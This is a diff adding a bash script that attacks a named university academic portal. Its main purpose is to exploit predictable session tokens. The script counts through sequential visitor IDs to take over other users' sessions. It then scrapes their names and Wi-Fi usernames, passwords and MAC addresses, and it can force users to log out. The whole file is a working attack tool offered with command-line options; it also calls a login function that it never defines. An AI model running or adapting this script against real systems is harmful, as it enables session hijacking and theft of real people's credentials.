@@ -1,0 +1,92 @@
+#!/bin/bash
+
+# Variables
+URL="https://academics.feb.ugm.ac.id"
+UA="Mozilla/5.0 (PLAYSTATION 3; 3.55)"
+
+public_token()
+{
+	curl -A "$UA" -L --silent -D - $URL/index.php | grep id_pengunjung | sed -e 's/\(.*\)=//'
+}
+
+public_scan()
+{
+	TOKEN=$1
+	while true; do
+		echo -n "$TOKEN: "
+		user_name $TOKEN
+		TOKEN=$(expr $TOKEN + 1)
+	done
+}
+
+public_view()
+{
+	TOKEN=$1
+	echo -n "Name: "
+	user_name $TOKEN
+	echo -n "Wi-Fi account: "
+	user_wifi $TOKEN
+}
+
+user_logout()
+{
+	TOKEN=$1
+	curl -A "$UA" --silent -b "id_pengunjung=$TOKEN;AG1=0000%7C0000" $URL/index.php?logout=1
+}
+
+user_name()
+{
+	TOKEN=$1
+	out=$(curl -A "$UA" --silent -b "id_pengunjung=$TOKEN;AG1=10%7C1000" \
+	$URL/index.php | \
+	grep "<td align='center'><b>" | \
+	sed -e "s/\(.*\)<td align='center'><b>//" -e "s/<br>/ (/" -e "s/<\/b><\/td>/)/")
+
+	if [ "$out" == "" ]; then echo "Free/Logged out"; else echo $out; fi
+}
+
+user_wifi()
+{
+	TOKEN=$1
+	curl -A "$UA" --silent -b "id_pengunjung=$TOKEN;AG1=10%7C1000"  \
+	"$URL/index.php?MS=1000|210" | \
+	grep -E '<td class=a>.*Username|<td class=a>.*Password|<td class=a>.*MAC' | \
+	sed -e 's/\(.*\)<td class=b>//' -e 's/<input\(.*\)//' -e 's/<\/td\(.*\)//' | \
+	tr '\n' ' '
+	echo ''
+}
+
+TEMP=`getopt -o i:ost:v: --long login:,logout,scan:,token,view: -n 'sintesis' -- "$@"`
+eval set -- "$TEMP"
+
+while true; do
+	case "$1" in
+		-i | --login )
+			user_login $2
+			shift 2
+			;;
+		-o | --logout )
+			user_logout $2
+			shift 2
+			;;
+		-s | --scan )
+			public_scan $2
+			shift 2
+			;;
+		-t | --token )
+			public_token
+			shift 2
+			;;
+		-v | --view )
+			public_view $2
+			shift 2
+			;;
+		-- )
+			shift
+			break
+			;;
+		* )
+			break
+			;;
+	esac
+done
